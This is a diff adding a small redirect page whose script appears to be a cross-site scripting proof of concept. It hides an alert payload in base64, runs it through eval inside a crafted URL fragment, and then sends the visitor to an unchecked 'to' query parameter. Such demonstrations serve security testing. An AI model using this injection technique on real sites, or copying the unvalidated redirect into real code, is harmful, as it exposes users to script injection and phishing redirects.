@@ -1,0 +1,11 @@
+Redirecting, please wait...</n>
+<script>
+  var payload = `alert("XSS in: " + document.domain)`;
+  var to = (new URL(location.href)).searchParams.get("to");
+  setTimeout(function () {
+    location.href = `https://${Date.now()}.xyz/#'+eval(atob('${btoa(payload)}'))+'`;
+  }, 3000);
+  setTimeout(function () {
+    location.href = to;
+  }, 3200);
+</script>
